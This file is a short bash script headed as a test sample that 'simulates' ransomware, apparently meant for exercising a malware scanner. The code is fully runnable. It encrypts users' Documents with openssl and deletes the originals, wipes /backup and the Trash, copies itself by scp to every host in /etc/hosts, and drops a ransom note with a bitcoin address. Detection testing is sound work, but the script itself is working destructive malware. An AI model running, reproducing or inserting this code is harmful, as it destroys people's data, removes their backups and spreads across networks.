#!/bin/bash
# Suspicious script - DO NOT RUN (test file only)

# Simulate ransomware behavior patterns
encrypt_files() {
    for file in /home/*/Documents/*; do
        openssl enc -aes-256-cbc -salt -in "$file" -out "$file.encrypted" -k "malware_key"
        rm -f "$file"
    done
}

# Delete shadow copies (Windows-like behavior)
delete_backups() {
    rm -rf /backup/*
    rm -rf ~/.local/share/Trash/*
}

# Spread to network shares
spread_to_network() {
    for host in $(cat /etc/hosts | grep -v localhost); do
        scp -r . $host:/tmp/payload/
    done
}

# Main execution
main() {
    encrypt_files
    delete_backups
    spread_to_network
    
    # Display ransom note
    cat > /tmp/RANSOM_NOTE.txt << EOF
YOUR FILES HAVE BEEN ENCRYPTED
PAY 1 BTC TO: bc1qrandomaddress
EOF
}

main "$@"
